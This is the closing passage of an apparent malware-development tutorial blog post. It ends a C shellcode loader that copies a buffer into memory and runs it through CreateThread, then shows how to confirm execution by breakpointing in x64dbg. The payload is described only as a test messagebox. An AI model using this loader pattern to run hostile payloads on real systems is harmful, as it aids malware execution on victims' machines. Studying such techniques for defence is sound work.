  <span class="n">memcpy</span><span class="p">(</span><span class="n">pAddress</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">dwSizeofBuf</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">pAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"CreateThread failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="tracing-the-execution" class="active">Tracing the execution<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#tracing-the-execution" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>You might face some issue when you first run this, the messagebox migh not execute, but to validate if your thread gets triggered or not we can debug it using <strong>x64dbg</strong> and trace the execution.</p>

<p>Since we are creating a thread, We can easily trigger a breakpoint on <strong>CreateThread</strong> API call and then navigate to our shellcode’s address and also put a breakpoint on one of its instructions, this way we can confirm our shellcode is being executed.</p>

<p>First load the binary and break on CreatThread:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-11.png" alt="P12"></p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-12.png" alt="P13"></p>

<p>After breaking on the call we check its third parameter, which will be <strong>lpStartAddress</strong> the address of our shellcode, follow this address in disassembler and put a breakpoint anywhere:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-13.png" alt="P14"></p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-14.png" alt="P15"></p>

<p>Run and we can see that our payload is being executed!</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-15.png" alt="P16"></p>

        
      </section>

      

      

      
  

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    

    
  
  














  

</body></html>